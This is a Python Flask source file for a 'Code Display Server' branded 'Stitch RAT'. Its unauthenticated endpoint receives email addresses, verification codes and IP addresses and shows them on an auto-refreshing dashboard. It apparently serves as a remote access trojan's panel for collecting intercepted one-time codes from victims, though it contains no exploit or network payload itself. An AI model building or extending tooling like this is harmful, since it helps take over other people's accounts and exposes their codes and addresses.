#!/usr/bin/env python3
"""
Code Display Server
Simple web interface to display verification codes
"""

from flask import Flask, render_template_string, request, jsonify
import json
import time
from datetime import datetime
import threading
import webbrowser
import os

app = Flask(__name__)

# Store verification codes
verification_codes = []
webhook_url = ""

# HTML template for displaying codes
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Verification Codes - Stitch RAT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .title {
            font-size: 2.5em;
            color: #333;
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .subtitle {
            color: #666;
            font-size: 1.1em;
        }
        
        .webhook-info {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .webhook-url {
            font-family: monospace;
            background: #e9ecef;
            padding: 8px 12px;
            border-radius: 5px;
            word-break: break-all;
            margin: 10px 0;
        }
        
        .code-item {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            margin: 15px 0;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .code-value {
            font-size: 2em;
            font-weight: bold;
            letter-spacing: 3px;
            text-align: center;
            background: rgba(255, 255, 255, 0.2);
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
        }
        
        .code-details {
            font-size: 0.9em;
            opacity: 0.9;
        }
        
        .timestamp {
            font-size: 0.8em;
            opacity: 0.8;
        }
        
        .no-codes {
            text-align: center;
            color: #666;
            font-style: italic;
            padding: 40px;
        }
        
        .refresh-btn {
            background: #28a745;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 1em;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
        }
        
        .refresh-btn:hover {
            background: #218838;
            transform: translateY(-2px);
        }
        
        .status {
            text-align: center;
            margin: 20px 0;
            padding: 10px;
            border-radius: 10px;
            font-weight: bold;
        }
        
        .status.online {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status.offline {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="title">🔐 Verification Codes</h1>
            <p class="subtitle">Stitch RAT Security System</p>
        </div>
        
        <div class="webhook-info">
            <h3>📡 Webhook Endpoint</h3>
            <div class="webhook-url" id="webhookUrl">{{ webhook_url }}</div>
            <p><small>Codes will appear here automatically when sent</small></p>
        </div>
        
        <div class="status online" id="status">
            ✅ System Online - Monitoring for codes
        </div>
        
        <div id="codesContainer">
            {% if codes %}
                {% for code in codes %}
                <div class="code-item">
                    <div class="code-header">
                        <strong>📧 {{ code.email }}</strong>
                        <span class="timestamp">{{ code.timestamp }}</span>
                    </div>
                    <div class="code-value">{{ code.code }}</div>
                    <div class="code-details">
                        IP: {{ code.ip_address }} | Method: {{ code.method }}
                    </div>
                </div>
                {% endfor %}
            {% else %}
                <div class="no-codes">
                    <h3>No verification codes yet</h3>
                    <p>Codes will appear here when users request them</p>
                </div>
            {% endif %}
        </div>
        
        <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
    </div>
    
    <script>
        // Auto-refresh every 5 seconds
        setInterval(function() {
            location.reload();
        }, 5000);
        
        // Update webhook URL
        document.getElementById('webhookUrl').textContent = '{{ webhook_url }}';
    </script>
</body>
</html>
"""

def add_verification_code(email, code, ip_address, method="automated"):
    """Add a verification code to the display"""
    verification_codes.append({
        'email': email,
        'code': code,
        'ip_address': ip_address,
        'method': method,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    
    # Keep only last 10 codes
    if len(verification_codes) > 10:
        verification_codes.pop(0)

@app.route('/')
def index():
    """Main page showing verification codes"""
    return render_template_string(HTML_TEMPLATE, 
                                codes=verification_codes, 
                                webhook_url=webhook_url)

@app.route('/api/codes')
def api_codes():
    """API endpoint for verification codes"""
    return jsonify(verification_codes)

@app.route('/api/add_code', methods=['POST'])
def api_add_code():
    """API endpoint to add verification code"""
    data = request.get_json()
    add_verification_code(
        data.get('email', ''),
        data.get('code', ''),
        data.get('ip_address', ''),
        data.get('method', 'api')
    )
    return jsonify({'status': 'success'})

def set_webhook_url(url):
    """Set the webhook URL"""
    global webhook_url
    webhook_url = url

def start_server(port=5001):
    """Start the code display server"""
    print(f"🚀 Starting Code Display Server on port {port}")
    print(f"📱 Open: http://localhost:{port}")
    
    # Try to open browser automatically
    try:
        webbrowser.open(f'http://localhost:{port}')
    except:
        pass
    
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == "__main__":
    start_server()